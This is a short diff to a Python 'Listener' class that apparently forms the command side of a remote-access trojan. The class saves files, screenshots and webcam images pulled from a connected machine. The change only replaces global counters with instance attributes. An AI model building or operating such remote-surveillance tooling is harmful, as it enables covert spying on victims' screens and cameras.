@@ -65,13 +65,11 @@ class Listener:
 					file_name = command.replace("download ", "")
 					self.write_file(file_name, result)
 				elif command.split()[0] == "screenshot":
-					self.write_file(f"screen_{src_count}.png", result)
-					global src_count
-					src_count += 1
+					self.write_file(f"screen_{self.src_count}.png", result)
+					self.src_count += 1
 				elif command.split()[0] == "camera":
-					self.write_file(f"camera_{cam_count}.jpg", result)
-					global cam_count
-					cam_count += 1
+					self.write_file(f"camera_{self.cam_count}.jpg", result)
+					self.cam_count += 1
 				else:
 					if result != None:
 						print(result)
